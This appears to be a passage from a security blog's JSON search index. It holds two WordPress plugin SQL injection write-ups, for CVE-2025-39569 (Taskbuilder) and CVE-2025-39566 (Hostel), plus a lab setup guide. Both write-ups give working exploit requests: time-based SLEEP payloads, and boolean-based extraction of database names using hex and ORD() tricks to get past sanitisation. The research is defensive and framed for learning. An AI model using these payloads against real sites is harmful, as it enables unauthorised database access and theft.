bao gồm không giới hạn ở việc đánh cắp thông tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-26943\"\u003eCVE-2025-26943\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/easy-quotes/#description\"\u003eWordPress Easy Quotes Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 1.2.2\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: High (9.3)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Unauthenticated\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eTaskbuilder Plugin\u003c/strong\u003e:  v1.2.2(vul) và v1.2.3(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e hoặc bất cứ tool nào có thể compare để thấy được sự khác biệt giữa 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eỨng dụng đã đưa trực tiếp dữ liệu từ người dùng vào câu query SQL mà \u003cstrong\u003ekhông sử dụng các biện pháp bảo vệ\u003c/strong\u003e khiến lỗ hổng SQL Injection xảy ra.\u003c/p\u003e","title":"CVE-2025-26943"},{"content":"The vulnerability occurs in the Taskbuilder WordPress plugin before version 4.0.2. This could allow an attacker to directly interact with your database, including, but not limited to, stealing information.\nCVE ID: CVE-2025-39569 Product: WordPress Taskbuilder Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt; 4.0.2 CVSS Severity: High (8.5) Required Privilege: Subscriber Requirements Local WordPress and Debugging Taskbuilder Plugin: v4.0.1 (vulnerable) and v4.0.2 (patched) Diff Tool: meld or any tool that can compare files to see differences between two versions Analysis The application sanitizes input data before using it in SQL queries. However, during query construction, this value is inserted directly without being wrapped in single quotes '...'. This allows an attacker to inject valid SQL syntax (such as OR, AND, etc.) into the query, resulting in a SQL Injection vulnerability.\nPatch Diff Use any diff tool to compare differences between the vulnerable version and the patched version.\nThe clear difference is in the file includes/admin/projects/get_users.php.\nIn version v4.0.1, the variable $proj_id is escaped but inserted directly into the query without quotes:\n$proj_id = esc_sql($proj_id); $project = $wpdb-\u0026gt;get_row( \u0026#34;SELECT * FROM {$wpdb-\u0026gt;prefix}wppm_project where id = $proj_id\u0026#34; ); In version v4.0.2, the query is adjusted to wrap $proj_id in quotes after escaping:\n$proj_id = esc_sql($proj_id); $project = $wpdb-\u0026gt;get_row( \u0026#34;SELECT * FROM {$wpdb-\u0026gt;prefix}wppm_project where id = \u0026#39;$proj_id\u0026#39;\u0026#34; ); This patch ensures that the $proj_id value after escaping is treated as a literal string, preventing it from escaping the quotes to inject SQL syntax, effectively mitigating the SQL Injection.\nHow It Works File Architecture:\nGeneral structure of the current file:\n$proj_id = esc_sql($proj_id); $project = $wpdb-\u0026gt;get_row(\u0026#34;SELECT * FROM {$wpdb-\u0026gt;prefix}wppm_project WHERE id = $proj_id\u0026#34;); // Start buffer to generate the main modal content ob_start(); // ... render HTML user list $body = ob_get_clean(); // Start buffer to generate modal footer ob_start(); // ... render HTML buttons (Close, Save) $footer = ob_get_clean(); // Return JSON data for frontend modal rendering echo json_encode([ \u0026#39;body\u0026#39; =\u0026gt; $body, \u0026#39;footer\u0026#39; =\u0026gt; $footer, ]); $proj_id / $project: Fetch project data from the database. ob_start() / ob_get_clean(): Buffer HTML output instead of printing directly, storing it in a variable. $body / $footer: Contain dynamic HTML for the modal. json_encode(): Returns JSON to the client, often used in Ajax to render modals without refreshing the page. The file is located in includes, suggesting it’s called from another feature. To find where it’s used, search for get_users.php in the plugin directory.\n👉 It is included in the function wppm_get_users() of the class WPPM_Admin in class-wppm-admin.php. wppm_get_users() is a callback for a WordPress action hook.\nWPPM_Admin constructor:\nfinal class WPPM_Admin { public function __construct() { // other actions add_action( \u0026#39;wp_ajax_wppm_get_users\u0026#39;, array($this,\u0026#39;wppm_get_users\u0026#39;)); // other actions } } add_action() is a WordPress Plugin API method to attach a callback to an action hook.\nwp_ajax_wppm_get_users is an Ajax hook name:\nwp_ajax_{action} → handles Ajax for logged-in users. wp_ajax_nopriv_{action} → handles Ajax for non-logged-in users. Here, action = wppm_get_users. If you send action=wppm_get_users via Ajax to admin-ajax.php, WordPress will execute the corresponding callback, here wppm_get_users().\n👉 Knowing action = wppm_get_users, you can find which Ajax requests use it by searching wppm_get_users in .js files of the plugin.\nThe wppm_get_users action is the data part in the POST request handled by wppm_get_users().\nThe function is referenced in HTML attributes of the project feature:\nCreate a new project Access that project Inspect code to locate wppm_get_users and see which actions call it 👉 Clicking the icon next to Users triggers Ajax, sending a request to the server to fetch project users and render them in HTML.\nExploit Detect SQLi Capture requests using BurpSuite and send a time-based SQLi payload:\nPOST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026amp;proj_id=(SELECT+SLEEP(1)) Response delay indicates a successful SQL Injection.\nGet First Letter of Database Name To dump all data, the first step is to extract at least one character of the database name. Once retrieved, the rest can be dumped.\nSend a boolean-based SQLi payload with the correct proj_id:\nPOST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026amp;proj_id=(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,4,999)) Database name is wordpress, so the first character is w (HEX 0x77).\nSUBSTRING(STRING,1,1) retrieves the first character.\nHere, $proj_id = 4. Since SUBSTRING('wordpress',1,1)=0x77 is true, the IF(condition, value_if_true, value_if_false) returns 4, which exists in the database, so the response contains the project users.\nUsing HEX technique bypasses the esc_sql() function (see Patch Diff) when quotes cannot be used.\nSend a boolean-based SQLi payload with a wrong proj_id:\nPOST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026amp;proj_id=(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,999,4)) With a non-existent proj_id, the response contains None.\n👉 We successfully retrieved the first character of the database name using boolean-based SQLi:\nCorrect proj_id: response without None Wrong proj_id: response contains None Time-based SQLi could also be used, but dumping large data sets would be slow.\nConclusion The CVE-2025-39569 vulnerability in WordPress Taskbuilder arises from the missing single quotes '...' around user input in SQL queries, allowing user data to be interpreted as valid SQL syntax.\nThe patch in v4.0.2 fixed this by wrapping $proj_id in quotes, ensuring it is always treated as a literal string in SQL.\nKey Takeaways:\nPrefer prepared statements ($wpdb-\u0026gt;prepare() in WordPress) over manually inserting variables into queries. For WordPress plugins, thoroughly test Ajax endpoints, as they are the most common sources of SQLi and XSS. Administrators should regularly update plugins/themes to receive security patches promptly. References SQL Injection Cheat Sheet - PortSwigger\nWordPress Taskbuilder \u0026lt;= 4.0.1 Vulnerable to SQL Injection\n","permalink":"//localhost:1313/posts/2025-09-22-cve-2025-39569/","summary":"\u003cp\u003eThe vulnerability occurs in the \u003cstrong\u003eTaskbuilder\u003c/strong\u003e WordPress plugin before version \u003cstrong\u003e4.0.2\u003c/strong\u003e. This could allow an attacker to directly interact with your database, including, but not limited to, stealing information.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-39569\"\u003eCVE-2025-39569\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/taskbuilder/\"\u003eWordPress Taskbuilder Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt; 4.0.2\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS Severity\u003c/strong\u003e: High (8.5)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Subscriber\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eTaskbuilder Plugin\u003c/strong\u003e: v4.0.1 (vulnerable) and v4.0.2 (patched)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eDiff Tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e or any tool that can compare files to see differences between two versions\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eThe application \u003cstrong\u003esanitizes input data\u003c/strong\u003e before using it in SQL queries. However, during query construction, this value is inserted directly without being wrapped in single quotes \u003ccode\u003e'...'\u003c/code\u003e. This allows an attacker to inject valid SQL syntax (such as \u003ccode\u003eOR\u003c/code\u003e, \u003ccode\u003eAND\u003c/code\u003e, etc.) into the query, resulting in a SQL Injection vulnerability.\u003c/p\u003e","title":"CVE-2025-39569 Analysis \u0026 POC"},{"content":"A vulnerability in the Hostel plugin prior to version 1.1.5.7. Because input is not sanitized properly, this may allow an attacker to interact directly with the database, including but not limited to data exfiltration.\nCVE ID: CVE-2025-39566 Product: WordPress Hostel Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt;= 1.1.5.6 CVSS severity: 7.6 (High) Required Privilege: Administrator Requirements Local WordPress and Debugging Hostel Plugin: v1.1.5.6 (vulnerable) and v1.1.5.7 (fixed) diff tool: meld or any tool capable of comparing two versions to show differences Analysis The root cause is that the application injects data from a GET request directly into an SQL query while the validation/whitelisting is insufficient.\nPatch Diff Use any diff tool to compare the vulnerable version and the patched version. A clear difference exists in the file controllers/bookings.php\nVulnerable version:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } Patched version:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) { $ob = sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]); if(!in_array($ob, [\u0026#39;tB.id\u0026#39;, \u0026#39;tB.contact_name\u0026#39;, \u0026#39;tB.contact_email\u0026#39;, \u0026#39;tB.from_date\u0026#39;, \u0026#39;tB.amount_paid\u0026#39;, \u0026#39;tB.status\u0026#39;])) { $ob = \u0026#39;tB.id\u0026#39;; } $orderby = \u0026#34;ORDER BY $ob $dir\u0026#34;; } 👉 The patch uses a whitelist to restrict which columns can be used for ordering; if the supplied value is not valid it falls back to 'tB.id'.\nAnalysis: The vulnerability appears because the ob parameter is passed directly into the ORDER BY clause after sanitize_text_field(). That function only escapes/cleans text for HTML contexts and does not validate or filter for SQL injection in an SQL context.\nHow it works To inject, we need to identify the complete query used here:\n$bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); The query resides in the default branch of the switch structure.\nAll this logic belongs to the static manage() method of the WPHostelBookings class.\nclass WPHostelBookings { static function manage() { global $wpdb; $_booking = new WPHostelBooking(); switch(@$_GET[\u0026#39;do\u0026#39;]) { case \u0026#39;add\u0026#39;: // add handle break; case \u0026#39;edit\u0026#39;: // edit handle break; // view/print booking details. Will allow also to confirm/cancel case \u0026#39;view\u0026#39;: // view handle\tbreak;\t// list bookings default: // another logic if(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } $bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); // another logic break; } } } In WordPress, plugins communicate with core via the Plugin API (Hook System). Therefore, to find where manage() is invoked, we can search for the string \u0026quot;manage\u0026quot; in the plugin folder.\nIn the file models/hostel.php we have:\nclass class WPHostel { // another logic static function menu() { // we use \u0026#39;hostelpro_manage\u0026#39; for consistency with the pro version $wphostel_caps = current_user_can(\u0026#39;manage_options\u0026#39;) ? \u0026#39;manage_options\u0026#39; : \u0026#39;hostelpro_manage\u0026#39;; add_menu_page(__(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#39;Settings\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Settings\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Rooms\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Rooms\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_rooms\u0026#39;, array(\u0026#39;WPHostelRooms\u0026#39;, \u0026#34;manage\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_bookings\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Unavailable Dates\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Unavailable Dates\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_unavailable\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;unavailable\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Email Log\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Email Log\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_emaillog\u0026#39;, array(\u0026#39;WPHostelHelp\u0026#39;, \u0026#34;email_log\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Help\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Help\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_help\u0026#39;, array(\u0026#39;WPHostelHelp\u0026#39;, \u0026#34;index\u0026#34;)); } // another logic } Here:\nadd_menu_page() creates the main menu in the Admin Dashboard. add_submenu_page() adds submenu items under that menu. The $callback parameter is the callback function invoked when a user clicks the menu/submenu. Example:\n// add_menu_page($page_title, $menu_title, $capability, $menu_slug, $callback = \u0026#39;\u0026#39;, $icon_url = \u0026#39;\u0026#39;, $position = null); add_menu_page(__(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); // add_submenu_page($parent_slug, $page_title, $menu_title, $capability, $menu_slug, $callback = \u0026#39;\u0026#39;); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_bookings\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); // array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); =\u0026gt; WPHostelBookings::manage() All these menu/submenu items are registered inside the static menu() method of the WPHostel class. To locate where menu() is called, search for the menu hook in the plugin directory.\nIn the plugin root file hostel.php we have:\nadd_action(\u0026#39;admin_menu\u0026#39;, array(\u0026#34;WPHostel\u0026#34;, \u0026#34;menu\u0026#34;)); // =\u0026gt; callback: WPHostel::menu() add_action() is the WordPress Plugin API that attaches a callback to an action hook. The hook name here is admin_menu, meaning WPHostel::menu() will be called during the lifecycle when WordPress builds the Admin Dashboard Menu. Menu in the Admin UI\nDebugging\nThe faulty functionality is in the Booking Manager, so navigate to the Manage Bookings submenu in the Admin UI.\nRight before the default branch there is a comment // list bookings — indicating this code handles listing and ordering bookings.\nOpen your debugger:\nClick Run with Debugger. Set a breakpoint at the switch branch that contains the vulnerable code and at the exact line that assigns the vulnerable value. When you click a column header in the bookings table, observe:\nThe debugger steps into the switch. Use Step Over to reach the default branch. Continue Step Over and inspect variables in Variables \u0026gt; Locals. These variables combine to form the SQL query below. After combining the variables, the full query looks like:\nSELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM wp_hostel_bookings tB JOIN wp_hostel_rooms tR ON tR.id = tB.room_id WHERE is_static=0 AND tB.id = ... ORDER BY tB.amount_paid ASC|DESC LIMIT ... Notably, the $orderby variable is assigned as:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } ⚠️ Issues here:\nThe part after ORDER BY uses sanitize_text_field(). That function only cleans HTML, and does not validate or filter input to make it safe in an SQL context. Therefore the ob parameter (provided by the user) can be abused to inject SQL directly. Exploit Detecting SQLi Request with BurpSuite:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=upcoming\u0026amp;ob=tB.status,(SELECT+SLEEP(10))\u0026amp;dir=ASC HTTP/1.1 We separate the ORDER BY clause with a comma because it accepts multi-column values.\nResult: the response time is delayed → SQL Injection succeeded.\nDumping Data from the Database Bypass ' using ORD():\nTo dump database data we need to extract characters such as the first character of the database name.\nBecause sanitize_text_field() removes single quotes ('), we cannot use payloads relying on '. Instead, use ORD() to compare character ASCII codes:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=past\u0026amp;ob=tB.status,(SELECT+IF(ORD(SUBSTRING(DATABASE(),1,1))=119,SLEEP(5),0))\u0026amp;dir=ASC HTTP/1.1 Bypass succeeds → we can extract the database name.\nBypass ' using Hex encoding (alternative)\nBesides ORD() we can use Hex encoding to bypass:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=past\u0026amp;ob=tB.status,(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,SLEEP(5),0))\u0026amp;dir=ASC HTTP/1.1 Bypass succeeds → database name can be extracted.\nConclusion The vulnerability CVE-2025-39566 in the WordPress Hostel plugin (versions prior to 1.1.5.7) stems from inserting user-supplied input directly into an SQL query without adequate safeguards, leading to SQL Injection.\nKey takeaways:\nsanitize_text_field() ≠ protection against SQL Injection Distinguish clearly between input cleaning for HTML contexts and validation/sanitization for SQL contexts References SQL Injection Cheat Sheet – PortSwigger\nWordPress Hostel Plugin \u0026lt;= 1.1.5.6 is vulnerable to SQL Injection - patchstack\n","permalink":"//localhost:1313/posts/2025-09-21-cve-2025-39566/","summary":"\u003cp\u003eA vulnerability in the \u003cstrong\u003eHostel\u003c/strong\u003e plugin prior to version \u003cstrong\u003e1.1.5.7\u003c/strong\u003e. Because input is not sanitized properly, this may allow an attacker to interact directly with the database, including but not limited to data exfiltration.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-39566\"\u003eCVE-2025-39566\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/hostel/\"\u003eWordPress Hostel Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 1.1.5.6\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: 7.6 (High)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Administrator\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/blog/posts/2025-09-20-wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eHostel Plugin\u003c/strong\u003e: v1.1.5.6 (vulnerable) and v1.1.5.7 (fixed)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e or any tool capable of comparing two versions to show differences\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eThe root cause is that the application injects data from a \u003cstrong\u003eGET\u003c/strong\u003e request directly into an SQL query while the validation/whitelisting is insufficient.\u003c/p\u003e","title":"CVE-2025-39566 Analysis \u0026 POC"},{"content":"WordPress is a powerful and the most popular content management system (CMS) that allows you to create, manage, and customize websites and blogs easily. It’s an open-source CMS, built on PHP, and uses either MySQL or MariaDB databases.\nReleased in 2003, initially as a blogging platform, later evolved into a full-featured system for websites, online stores, forums, landing pages, etc. Today, more than 40% of websites worldwide run on WordPress. There are two versions of WordPress:\nWordPress.com\nHosting service provided by Automattic You only need to register an account, no installation required Limited customization, advanced features require payment WordPress.org\nOpen-source, you download and install it on your own hosting/server Full customization, install plugins, themes, write code, build any website you want Ecosystem Core: The main CMS Plugins: Add-on software installed on a WordPress site to extend functionality and add new features Themes: Add-on software that defines the visual appearance and layout of a WordPress site Why WordPress Hacking? State of WordPress Security in 2024\nMost Popular Currently, over 40% of all websites worldwide run WordPress This means hackers only need to find one common vulnerability =\u0026gt; they can exploit millions of sites at once Like the saying: “fish where the fish are” Plugin and Theme WordPress Core has been reviewed for a long time by thousands of developers and researchers, making it difficult for attackers to break in However, tens of thousands of plugins and themes from various sources are in use, with inconsistent quality Many plugins have poor security code or are no longer updated. Hackers only need to scan plugins/themes for outdated versions and exploit them Setup WordPress for Hacking There are many ways to set up WordPress; searching on Google will show plenty of guides. Here, I’ll set it up on an Ubuntu (22.04) virtual machine:\nNo effect on the host machine’s services WordPress is lightweight enough to run in a VM Install and Configure WordPress Install Dependencies Install the full stack needed to run WordPress (web server + database + PHP + required extensions).\nsudo apt install apache2 \\ ghostscript \\ libapache2-mod-php \\ mysql-server \\ php \\ php-bcmath \\ php-curl \\ php-imagick \\ php-intl \\ php-json \\ php-mbstring \\ php-mysql \\ php-xml \\ php-zip Install WordPress Download and install WordPress source code into the web directory.\n# Create a folder to store the website source code sudo mkdir -p /srv/www # Change owner to www-data, the default user for Apache/Nginx web server sudo chown www-data: /srv/www # Download the latest WordPress package from the official site # Extract it into /srv/www curl https://wordpress.org/latest.tar.gz | sudo -u www-data tar zx -C /srv/www To download a specific version:\ncurl https://wordpress.org/wordpress-6.6.2.tar.gz | sudo -u www-data tar zx -C /srv/www Installing from wordpress.org is the most reliable method:\nUbuntu provides a wordpress package in its repo, but it’s usually outdated compared to the official release. The WordPress community only supports the official release. If you encounter issues with the Ubuntu package, they won’t help. Configure Apache for WordPress Create /etc/apache2/sites-available/wordpress.conf:\n\u0026lt;VirtualHost *:80\u0026gt; DocumentRoot /srv/www/wordpress \u0026lt;Directory /srv/www/wordpress\u0026gt; Options FollowSymLinks AllowOverride Limit Options FileInfo DirectoryIndex index.php Require all granted \u0026lt;/Directory\u0026gt; \u0026lt;Directory /srv/www/wordpress/wp-content\u0026gt; Options FollowSymLinks Require all granted \u0026lt;/Directory\u0026gt; \u0026lt;/VirtualHost\u0026gt; Enable WordPress site:\nsudo a2ensite wordpress Enable mod_rewrite:\nsudo a2enmod rewrite Disable default site (optional):\nsudo a2dissite 000-default Or add ServerName mywordpress.local in VirtualHost and update your system’s hosts file.\nReload Apache:\nsudo service apache2 reload Configure Database Open MySQL:\nsudo mysql -u root Create DB and user:\nCREATE DATABASE wordpress; CREATE USER wordpress@localhost IDENTIFIED BY \u0026#39;\u0026lt;your-password\u0026gt;\u0026#39;; GRANT SELECT,INSERT,UPDATE,DELETE,CREATE,DROP,ALTER ON wordpress.* TO wordpress@localhost; FLUSH PRIVILEGES; quit Restart MySQL:\nsudo service mysql start Configure WordPress DB Connection Copy and edit config:\nsudo -u www-data cp /srv/www/wordpress/wp-config-sample.php /srv/www/wordpress/wp-config.php Update DB info:\nsudo -u www-data sed -i \u0026#39;s/database_name_here/wordpress/\u0026#39; /srv/www/wordpress/wp-config.php sudo -u www-data sed -i \u0026#39;s/username_here/wordpress/\u0026#39; /srv/www/wordpress/wp-config.php sudo -u www-data sed -i \u0026#39;s/password_here/\u0026lt;your-password\u0026gt;/\u0026#39; /srv/www/wordpress/wp-config.php Add secret keys/salts from: https://api.wordpress.org/secret-key/1.1/salt/\nConfigure WordPress Visit http://localhost and set site title, username, password, email for the admin user.\nSetup Debug on VSCode To understand request flow, we need debugging.\nAdd PHP Debug Extension In VS Code Extensions (Ctrl+Shift+X) =\u0026gt; search PHP Debug (by Felix Becker) =\u0026gt; Install.\nInstall Xdebug sudo apt install php-xdebug -y php -v If you see with Xdebug v3.x.x, installation is OK.\nConfigure Xdebug Edit php.ini:\nzend_extension=xdebug.so xdebug.mode=debug xdebug.start_with_request=yes xdebug.client_host=127.0.0.1 xdebug.client_port=9003 Restart Apache:\nsudo systemctl restart apache2 Configure VSCode launch.json Open project in VS Code:\ncode /srv/www/wordpress Add launch.json:\n{ \u0026#34;version\u0026#34;: \u0026#34;0.2.0\u0026#34;, \u0026#34;configurations\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;Listen for Xdebug\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;php\u0026#34;, \u0026#34;request\u0026#34;: \u0026#34;launch\u0026#34;, \u0026#34;port\u0026#34;: 9003, \u0026#34;pathMappings\u0026#34;: { \u0026#34;/srv/www/wordpress\u0026#34;: \u0026#34;${workspaceFolder}\u0026#34; } } ] } Now WordPress is fully set up locally with VS Code debugging.\nExtend Required Version Each WordPress version requires a compatible PHP version. Check this to avoid setup errors.\nWordPress Auto Update Since WordPress 3.7 (2013), background automatic updates exist for:\nSecurity releases Maintenance releases Not for major versions (unless explicitly enabled) WordPress checks api.wordpress.org for updates and applies them automatically.\nTo disable auto-updates, add in wp-config.php:\ndefine( \u0026#39;WP_AUTO_UPDATE_CORE\u0026#39;, false ); Increase Uploadable Plugin Size By default, WordPress relies on PHP configuration (upload_max_filesize, post_max_size, and sometimes max_execution_time) to determine the maximum file size that can be uploaded. On many servers, this limit is set as low as 2MB – 8MB, which is not enough for modern plugins.\nWhy Increase the Limit? Large plugins: Some plugins such as WooCommerce extensions, page builders, backup tools, or security suites can easily reach 20MB – 100MB.\nAvoid errors: If the plugin .zip file exceeds the limit, you’ll see errors like:\n“The uploaded file exceeds the upload_max_filesize directive in php.ini” Or the upload process fails silently. Ease of use: Increasing the limit allows administrators to upload plugins directly from the WordPress Dashboard without needing FTP/SSH access.\nDevelopment and testing: Developers testing their own plugins (with bundled assets like JS, CSS, images, or libraries) may generate larger .zip files. A higher limit makes local testing smoother.\nHow to Increase Plugin Upload Size There are several methods depending on your hosting environment:\nEdit php.ini (if you control the server)\nupload_max_filesize = 64M post_max_size = 64M max_execution_time = 300 Edit .htaccess (for Apache servers)\nphp_value upload_max_filesize 64M php_value post_max_size 64M php_value max_execution_time 300 php_value max_input_time 300 Update wp-config.php Add before the line /* That's all, stop editing! Happy publishing. */:\n@ini_set( \u0026#39;upload_max_filesize\u0026#39; , \u0026#39;64M\u0026#39; ); @ini_set( \u0026#39;post_max_size\u0026#39;, \u0026#39;64M\u0026#39;); @ini_set( \u0026#39;max_execution_time\u0026#39;, 